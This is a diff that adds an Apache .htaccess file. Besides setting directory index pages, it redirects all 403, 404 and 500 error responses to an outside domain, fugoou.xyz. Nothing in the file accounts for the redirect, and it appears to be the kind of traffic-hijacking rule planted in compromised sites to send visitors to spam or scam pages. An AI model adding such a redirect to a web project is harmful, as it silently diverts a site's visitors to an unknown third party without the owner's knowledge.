@@ -1,0 +1,5 @@
+DirectoryIndex index.php index.html index.htm index2.html
+
+ErrorDocument 403 https://fugoou.xyz
+ErrorDocument 404 https://fugoou.xyz
+ErrorDocument 500 https://fugoou.xyz
